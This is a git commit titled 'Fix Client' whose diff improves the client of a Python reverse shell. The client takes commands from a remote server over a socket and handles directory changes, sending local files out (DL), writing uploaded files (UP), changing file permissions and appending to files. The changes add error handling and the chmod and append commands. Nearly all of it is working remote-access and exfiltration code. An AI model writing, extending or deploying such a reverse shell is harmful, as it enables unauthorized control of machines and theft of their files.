150cc469d7018819733148234436ec1abd75f5f1
Joe Abbate <josephabbateny@gmail.com>
2022-02-17 17:13:44 -0500

    Fix Client

--- reverse-shell/client.py
+++ reverse-shell/client.py
@@ -25,40 +25,64 @@ signal.signal(signal.SIGTERM, closeServer)
 while True:
   # get the command input from server
   data = s.recv(1024)
-
   # handle the server telling the client to exit
   if data[:4].decode("utf-8") == 'exit':
+    s.send(str.encode("OK"))
     s.close()
     exit(0)
 
   # the `cd` command is special, we need to change python's context
   if data[:2].decode("utf-8") == 'cd':
     try:
-      os.chdir(data[3:].decode("utf-8")) # the -1 removes the \n from the end of the line
+      os.chdir(data[3:].decode("utf-8"))
       s.send(str.encode(os.getcwd()))
     except FileNotFoundError:
       s.send(str.encode("Dir does not exist"))
     continue
 
   if data[:2].decode("utf-8") == 'DL':
-    with open(data[3:].decode("utf-8"), "rb") as file:
-      data = file.read(1024)
-      while data:
-        s.send(data)
-        resp = str(s.recv(1024),"utf-8")
+    try:
+      with open(data[3:].decode("utf-8"), "rb") as file:
         data = file.read(1024)
-      s.send(str.encode("DONE"))
+        while data:
+          print("Send")
+          s.send(data)
+          resp = str(s.recv(1024),"utf-8")
+          data = file.read(1024)
+        s.send(str.encode("DONE"))
+    except:
+      s.send(str.encode("ERR"))
     continue
 
   if data[:2].decode("utf-8") == 'UP':
-    with open(data[3:].decode("utf-8"), "ab") as file:
-      s.send(str.encode("READY"))
-      data = s.recv(1024)
-      while data != b'DONE':
-        file.write(data)
-        s.send(str.encode("ACK"))
+    try:
+      with open(data[3:].decode("utf-8"), "wb") as file:
+        s.send(str.encode("READY"))
         data = s.recv(1024)
-      s.send(str.encode("DONE"))
+        while data != b'DONE':
+          file.write(data)
+          s.send(str.encode("ACK"))
+          data = s.recv(1024)
+        s.send(str.encode("DONE"))
+    except:
+      s.send(str.encode("ERR"))
+    continue
+ 
+  if data[:5].decode("utf-8") == 'chmod':
+    try:
+      args = data.decode("utf-8").split()
+      perms = oct(int(args[1],8))
+      os.chmod(args[2], perms)
+    except Exception:
+      pass
+    s.send(str.encode("OK"))
+    continue
+
+  if data[:3].decode('utf-8') == 'APP':
+    args = data.decode('utf-8').split(" ")
+    with open(args[-1],"a") as file:
+      file.write(" ".join(args[1:-1]) + "\n")
+    s.send(str.encode("Appended!"))
     continue
 
   # check if there are actually data/commands received (that is not cd)
